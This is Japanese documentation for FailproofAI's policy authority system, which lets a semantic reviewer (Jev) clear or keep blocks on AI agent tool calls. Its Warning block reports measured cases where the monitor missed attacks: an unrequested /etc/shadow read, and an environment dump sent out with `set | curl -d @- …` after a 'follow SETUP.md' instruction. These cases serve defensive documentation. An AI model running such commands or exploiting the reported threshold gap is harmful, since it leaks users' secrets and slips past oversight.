FailproofAI Cloudまたはご自身のキーを使って [Jev ポリシーレビュー](/ja/policies/jev) を設定すると、各ゲート付きツール呼び出しは、実行中のポリシーと、その呼び出しが実際に何をするのか・タスクを入力した人物がそれを要求したかどうかを問うJevによって判断されます。両者が意見を異にする場合、各ポリシーの**権限**が何が起きるかを決定します。

Jevが設定されていない場合、権限は効果を持ちません。すべてのポリシーはこれまでどおりに適用されます。

## ハードとレビュー可能

- **ハード**はデフォルトです。ハードポリシーのdenyまたは指示は最終的なものであり、Jevはそれをクリアできません。ハードなdenyはJevを待たずに呼び出しを停止します。
- **レビュー可能**とは、Jevがポリシーの判定をクリアできることを意味しますが、ポリシーが`reviewedBy`に指定したセマンティックチェックを通じてのみ可能です。判定がクリアされるのは、指定されたすべてのチェックがこの呼び出しについて問い合わせられ、それぞれが何も見つけなかったか、ユーザーがこれを要求したと記録した場合のみです。**発火した**チェック（懸念事項を発見した）に対してユーザーが要求していない場合、そのチェック自体の判定が警告のみであっても、ブロックは維持されます。そのツールに適用されないために問い合わせられなかったチェックは、他のチェックの結果に関わらず何もクリアしません。1つの緩和はコンセントとみなされます。呼び出しがユーザーが与えたタスクのステップであり、それ以上に及ばない場合、Jevはdenyを警告に変え、その警告がポリシーのブロックをクリアし、エージェントに伝えられます。

ポリシーがレビュー可能となるのは、以下のすべてが満たされる場合のみです：

1. `authority: "reviewable"` を宣言している。
2. `reviewedBy` が空でないリストであり、すべてのエントリがインストール済みパックの宣言するJevチェックである。Failproof AIはJevチェックを提供しません。[下記の16個](#semantic-policy-names)は`failproofai policies add FailproofAI/jev-policies`から取得されます。チェックを宣言するパックがない場合、すべてのポリシーはハードになります。
3. `alwaysOn` ではない。Failproof AIを無効化しようとするエージェントを止めるガードは常にハードです。

それ以外はすべてハードです：フィールドの欠落、値のスペルミス、空または不正な`reviewedBy`、またはこのマシンが問い合わせられないチェックの名前。不明な名前は宣言全体をハードにします（スキップされません）。なぜなら`reviewedBy`は「これらすべてが問い合わせられ、いずれもdenyしてはならない」を意味し、名前をスキップすることで要求した数より少ないチェックでJevがポリシーをクリアできてしまうからです。

Jevが設定されると、Failproof AIは`reviewable`宣言を拒否した場合にプロセスあたり1回警告をログに記録します。Jevなしでは何も出力しません。権限が何も決定しないためです。`failproofai publish`はそのような宣言を含むパックのビルドを拒否するため、パック作成者はインストール前に気づきます。チェックを宣言するパックの場合はそのパックが宣言するチェックに対して`reviewedBy`を検証し、そうでない場合は16個の`FailproofAI/jev-policies`の名前に対して検証します。

## 権限の宣言場所

ポリシーがマシンに届く方法ごとに、権限を決定する場所が1つあります：

| ソース | 宣言場所 | デフォルト |
| --- | --- | --- |
| 組み込みポリシー | 下記のテーブル | レビュー可能としてリストされていない限りハード |
| 独自ポリシーファイル | `customPolicies.add`の`authority`と`reviewedBy` | ハード |
| ポリシーパック | パックマニフェスト（`failproofai-pack.json`）内の各ポリシーエントリ | ハード |
| クラウド管理ポリシー | アクティブなデプロイメントにおけるポリシーのアサイン | ハード。デプロイメントはまだ設定しないため、クラウド管理ポリシーはすべて現在ハードです。 |

パックまたはクラウド管理ポリシーの場合、ポリシーコード内に設定されたフィールドは無視されます。マニフェストまたはアサインが決定します。パックは自身のポリシーのみ記述できます。ポリシー名に`/`を含めることができず、パック自身のプレフィックス下に登録されるため、マニフェストが組み込みポリシーや別のパックのポリシーをレビュー可能とマークすることはできません。パックのコードが登録したがマニフェストで宣言していないポリシーはハードになります。

バイト単位で同一のコードを持つ2つのパックまたはクラウド管理ポリシーは、1つのアーティファクトを共有し、1つのポリシーとして読み込まれます。そのポリシーがレビュー可能となるのは、それらすべてがレビュー可能と宣言した場合のみであり、Jevはそれらが指定するすべてのチェックをクリアする必要があります。いずれかがハードと宣言した場合、または宣言しない場合、ハードのままです。パックやポリシーが列挙される順序は関係ありません。

ほとんどのマシンは`FailproofAI/policies`パックから組み込みポリシーを取得し、そのパックのマニフェストから権限を読み取ります。下記のレビュー可能なエントリは、それらを含むパックのリリースがインストールされた後に有効になります。古いリリースにはそれらが含まれないため、そのすべてのポリシーはハードのままです。

## 独自ポリシーでの権限宣言

```js
import { customPolicies, deny, allow } from "failproofai";

customPolicies.add({
  name: "block-prod-config-reads",
  description: "Keep production credentials out of the agent's context",
  match: { events: ["PreToolUse"] },
  authority: "reviewable",
  reviewedBy: ["secret-exposure"],
  fn: async (ctx) =>
    String(ctx.toolInput?.file_path ?? "").includes("/config/prod/")
      ? deny("Production config is off limits")
      : allow(),
});
```

`failproofai publish`は両フィールドをパックマニフェストにコピーするため、パックとして公開されたポリシーは作者が設定した権限を保持します。宣言が受け入れられない場合はパックのビルドを拒否します。`"hard"`または`"reviewable"`以外の値、リストでない`reviewedBy`、またはチェックでない名前（チェックを宣言する場合はパック自身の [Jevチェック](/ja/policies/publish-a-pack#jev-checks-in-a-pack)、そうでない場合は組み込みチェック）が該当します。

## 組み込みポリシー

セマンティックポリシーが同じ懸念を実質的にカバーする場合のみレビュー可能です。その他のすべての組み込みポリシーはハードです。

懸念をカバーすることは必要条件ですが十分条件ではなく、誤りの両方向は静かに起きます：

- **一度も問い合わせられないチェック**はブロックを永続させます。`reviewedBy`は論理積であり、問い合わせられなかったチェックはクリアしません。そのため、ポリシーがマッチする形状に対して前提条件が発火しないチェックとペアになったポリシーは、一切クリアされません。
- **問い合わせられたが発火しないチェック**は「懸念なし」と答え、懸念なしはクリアします。そのため、ポリシーの形状をモデル化しないチェックとペアにすることはポリシーのレビューになりません。チェックが理解しない入力に対してポリシーをオフにするだけです。

instruct モードのセマンティックポリシーはdenyと答えることはできませんが、ブロックを維持することはできます。発火してユーザーがその呼び出しを要求していない場合、レビューするポリシーはクリアされません。`FailproofAI/jev-policies`の6つのチェックはinstructのみです。`push-to-protected-branch`、`commit-on-protected-branch`、`read-outside-workspace`、`system-modification`、`env-secrets-dump`、`external-data-egress`であり、[下記テーブル](#semantic-policy-names)に各チェックのモードが記載されています。問うべき点は**「denyできるものが何か残っているか」**です。クリアは懸念が何にも適用されないままにしてはなりません。エンジンは呼び出しごとにそのテストを適用します。誰もコンセントしていない警告はクリアではありません。ツール呼び出しの前では、警告はエージェントを止めないためです。そして、denyできるチェックが警告を発した場合（証拠がdenyラインに達しなかった）、ユーザーがその呼び出しを要求していなければ、その呼び出しでは何もクリアされず、すべての正規表現denyが維持されます。

<Warning>
**発火ラインをわずかに下回るチェックはフロアを維持しません。** 上記のルールはチェックが*発火*する（証拠 ≥ 0.7）ことを必要とします。関連するすべてのチェックがその値を下回る場合、何も発火せず、レビュアーは「懸念なし」と答え、レビュー可能なdenyはクリアされます。enforceモードで実際に測定：要求されていない`/etc/shadow`の読み取り（`secret-exposure` 0.69、`read-outside-workspace` 0.37、ホームディレクトリパスのみモデル化）と「follow SETUP.md」後の`set | curl -d @- …`（`env-secrets-dump` 0.66、`credential-exfiltration` 0.65で`sends_out` 0.97）の両方が許可されましたが、正規表現層のみではdenyされます。閾値はラベル付きコーパスで較正されており、これに対して再測定されていません。それまでは、これらの形状のいずれかが通過することがその誤ブロックより重要な場合、ポリシーを**ハード**のままにしてください。
</Warning>

## セマンティックポリシー名 \{#semantic-policy-names\}

これらは`FailproofAI/jev-policies`が宣言するチェックであり、インストール後に`reviewedBy`が受け付ける値です。Failproof AI自体はそれらを提供しません。そのパック（またはこれらの名前を宣言する別のパック）がない場合、それらを指定するポリシーはreviewableになりません。各チェックは、目の前のツール呼び出しについてJevが回答するものです。**モード**はチェックが回答できる内容です。`deny`チェックは強い証拠があればブロックし、`instruct`チェックは常に警告のみを発します。いずれも、発火してユーザーが呼び出しを要求していない場合、ポリシーのdenyを維持します。**ユーザーによるオーバーライド可否**は、人間の明示的な要求によってクリアできるかどうかを示します。

Jevは、インストール済みパックが宣言する [Jevチェック](/ja/policies/publish-a-pack#jev-checks-in-a-pack) に対してのみ問い合わせを行い、それらが`reviewedBy`が受け付ける名前です。2つのパックが異なる方法で宣言した名前はどちらにも適用されません。FailproofAIリポジトリからインストールされていないパックがこれら16個の名前を宣言した場合、そのパックでは無視されます。そのバージョンは問い合わせられず、FailproofAI自身のものと競合しません。そのため、サードパーティパックがコアパックのポリシーをクリアするチェックになったり、これらのチェックの1つをオフにしたりすることはできません。読み取り不能なパックリスト、またはすべてのチェックが使用できないパックは、Jevに問い合わせるものを残しません。

| --- | --- | --- | --- |

| `production-infra-change` | deny | 可 | 本番インフラの変更。 |

| `secret-exposure` | deny | 可 | クレデンシャルの読み取りまたはコピー。 |
